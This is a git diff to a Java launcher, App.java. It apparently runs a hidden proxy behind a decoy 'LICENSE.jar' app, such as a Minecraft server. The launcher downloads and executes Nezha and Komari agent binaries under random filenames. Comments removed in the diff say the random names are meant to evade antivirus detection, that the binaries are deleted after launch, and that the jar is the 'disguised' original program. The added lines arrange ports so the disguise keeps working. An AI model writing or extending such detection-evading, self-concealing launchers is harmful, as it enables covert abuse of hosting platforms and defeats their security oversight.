@@ -30,11 +30,12 @@ import java.util.concurrent.ConcurrentHashMap;
 
 public class App {
     
-    // 允许读取的所有环境变量键名
+    // 允许读取的所有环境变量键名 (新增了 LICENSE_PORT)
     private static final String[] ALL_ENV_VARS = {
         "UUID", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", 
         "KOMARI_SERVER", "KOMARI_KEY", "DOMAIN", "SUB_PATH", 
-        "NAME", "WSPATH", "SERVER_PORT", "PORT", "AUTO_ACCESS", "DEBUG"
+        "NAME", "WSPATH", "SERVER_PORT", "PORT", "AUTO_ACCESS", "DEBUG",
+        "LICENSE_PORT" 
     };
 
     private static final Map<String, String> envVars = new HashMap<>();
@@ -93,9 +94,7 @@ public class App {
         System.out.println(new Date() + " - INFO - " + msg);
     }
     
-    // 参考 NanoLimbo 的高级 .env 解析机制
     private static void loadEnvVars() {
-        // 1. 读取系统环境变量
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
@@ -103,7 +102,6 @@ public class App {
             }
         }
         
-        // 2. 读取当前目录下的 .env 文件
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             log("Found .env file, parsing variables...");
@@ -112,10 +110,7 @@ public class App {
                     line = line.trim();
                     if (line.isEmpty() || line.startsWith("#")) continue;
                     
-                    // 去除行内注释 (支持 # 和 // )
                     line = line.split(" #")[0].split(" //")[0].trim();
-                    
-                    // 去除 export 前缀
                     if (line.startsWith("export ")) {
                         line = line.substring(7).trim();
                     }
@@ -123,7 +118,6 @@ public class App {
                     String[] parts = line.split("=", 2);
                     if (parts.length == 2) {
                         String key = parts[0].trim();
-                        // 去除首尾的单双引号
                         String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                         
                         if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
@@ -257,7 +251,6 @@ public class App {
         return "";
     }
     
-    // 生成随机文件名 (规避查杀)
     private static String generateRandomName(String suffix) {
         String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
         StringBuilder result = new StringBuilder();
@@ -268,7 +261,6 @@ public class App {
         return result.toString() + suffix;
     }
 
-    // 下载文件，使用原生 File API 赋权
     private static boolean downloadExecutable(String fileName, String fileUrl) {
         try {
             Path path = Paths.get(fileName);
@@ -277,7 +269,7 @@ public class App {
             if (response.statusCode() == 200) {
                 Files.write(path, response.body());
                 File f = path.toFile();
-                f.setExecutable(true, false); // 原生赋权，无需 chmod
+                f.setExecutable(true, false); 
                 return true;
             }
         } catch (Exception e) {
@@ -286,10 +278,8 @@ public class App {
         return false;
     }
 
-    // ================== Komari 逻辑 ==================
     private static void startKomari() {
         if (KOMARI_SERVER.isEmpty() || KOMARI_KEY.isEmpty()) {
-            log("⚠️ KOMARI_SERVER or KOMARI_KEY is missing, skipping komari.");
             return;
         }
         
@@ -304,7 +294,6 @@ public class App {
         String endpoint = KOMARI_SERVER.startsWith("http") ? KOMARI_SERVER : "https://" + KOMARI_SERVER;
         
         try {
-            // 直接使用 ProcessBuilder 启动，抛弃 nohup 与 sh，避免环境兼容问题
             ProcessBuilder pb = new ProcessBuilder("./" + komariFileName, "-e", endpoint, "-t", KOMARI_KEY);
             pb.redirectOutput(new File("/dev/null"));
             pb.redirectErrorStream(true);
@@ -312,7 +301,6 @@ public class App {
             
             log("✅ komari service initialized successfully.");
             
-            // 阅后即焚
             new Timer().schedule(new TimerTask() {
                 @Override
                 public void run() { 
@@ -325,7 +313,6 @@ public class App {
         }
     }
     
-    // ================== Nezha 逻辑 ==================
     private static void startNezha() {
         if (NEZHA_SERVER.isEmpty() || NEZHA_KEY.isEmpty()) return;
         
@@ -380,27 +367,42 @@ public class App {
         }
     }
 
-    // ================== 原程序拉起逻辑 ==================
-    private static void startOriginalApp() {
+    // ================== 原程序拉起与端口冲突防护逻辑 ==================
+    private static void startOriginalApp(int currentAppPort) {
         Path licenseJar = Paths.get("LICENSE.jar");
+        
+        // 【1. 智能检测】：只有查找到 LICENSE.jar 才会启动
         if (!Files.exists(licenseJar)) {
-            log("⚠️ LICENSE.jar not found, skipping original app startup.");
+            log("⚠️ LICENSE.jar not found in current directory, skipping.");
             return;
         }
 
         try {
-            // 获取当前运行环境的 java 路径，确保兼容性
+            // 【2. 防冲突分配】：从 LICENSE_PORT 获取，如果没有则自动分配 currentAppPort + 1
+            String customPortStr = getEnv("LICENSE_PORT", "");
+            int targetPort;
+            if (!customPortStr.isEmpty()) {
+                targetPort = Integer.parseInt(customPortStr);
+            } else {
+                targetPort = findAvailablePort(currentAppPort + 1);
+            }
+
             String javaBin = Paths.get(System.getProperty("java.home"), "bin", "java").toString();
             
-            ProcessBuilder pb = new ProcessBuilder(javaBin, "-jar", "LICENSE.jar");
-            // 继承控制台 IO，这样 LICENSE.jar 的运行日志也会正常打印出来
+            // 【3. 兼容 Minecraft】直接附加 --port 参数强制覆盖其默认配置，避免冲突
+            ProcessBuilder pb = new ProcessBuilder(javaBin, "-jar", "LICENSE.jar", "--port", String.valueOf(targetPort));
+            
+            // 顺便往环境变量里注入 PORT 防止其它类型的程序（如 SpringBoot）不知道端口
+            Map<String, String> env = pb.environment();
+            env.put("PORT", String.valueOf(targetPort));
+            env.put("SERVER_PORT", String.valueOf(targetPort));
+
             pb.inheritIO(); 
-            
             Process p = pb.start();
-            activeProcesses.add(p); // 加入进程池，随主程序一起退出
+            activeProcesses.add(p);
             
-            log("✅ Original app (LICENSE.jar) started successfully.");
-        } catch (IOException e) {
+            log("✅ Original app (LICENSE.jar) started successfully on protected PORT: " + targetPort);
+        } catch (Exception e) {
             log("❌ Error running LICENSE.jar: " + e.getMessage());
         }
     }
@@ -782,7 +784,6 @@ public class App {
     }
     
     public static void main(String[] args) {
-        // 关闭钩子：主程序结束时杀死所有后台探针子进程及原程序
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
             for (Process p : activeProcesses) {
                 if (p != null && p.isAlive()) p.destroy();
@@ -796,9 +797,6 @@ public class App {
         startNezha();
         startKomari(); 
         addAccessTask();
-        
-        // --- 新增调用：拉起你伪装的原程序 ---
-        startOriginalApp();
         
         EventLoopGroup bossGroup = new NioEventLoopGroup(1);
         EventLoopGroup workerGroup = new NioEventLoopGroup();
@@ -824,10 +822,14 @@ public class App {
                     .childOption(ChannelOption.TCP_NODELAY, true)
                     .childOption(ChannelOption.SO_KEEPALIVE, true);
             
+            // 代理程序先抢占并绑定端口
             int actualPort = findAvailablePort(PORT);
             Channel ch = b.bind(actualPort).sync().channel();
-            
             log("✅ server is running on port " + actualPort);
+            
+            // 只有代理端口稳定绑定后，再拉起 LICENSE.jar，强制避开冲突端口
+            startOriginalApp(actualPort);
+            
             ch.closeFuture().sync();
             
         } catch (InterruptedException e) {
